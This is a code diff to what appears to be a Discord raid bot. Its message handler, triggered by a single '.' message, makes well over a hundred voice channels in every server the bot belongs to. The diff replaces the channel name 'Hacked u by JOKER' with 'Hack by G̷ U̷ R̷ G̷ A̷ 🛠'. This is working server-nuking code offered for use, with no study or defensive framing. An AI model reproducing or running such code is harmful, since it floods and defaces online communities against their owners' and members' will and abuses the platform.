@@ -286,178 +286,146 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === ".") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
           
                  
-                 
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-                  
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-                  
-   
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-                 
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-                 
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-  
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-                  
-                 
-                 
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-                 
-                 
-                 
-                 
-                 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
                  
        
                  
                  
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-                 
-                 
+
         
                  
                  
@@ -474,32 +442,102 @@ m.createChannel('Hacked u by JOKER', 'voice');
 LOka.on('message', message => {
          if (message.content === ".") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-              
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JIKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
- 
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
@@ -559,22 +597,38 @@ m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-                
                    
+                
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');                   
                    
         
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked by JOKER', 'voice');
-m.createChannel('Hacked by JOKER', 'voice');
-m.createChannel('Hacked by JOKER', 'voice');
-m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
                 
-                   
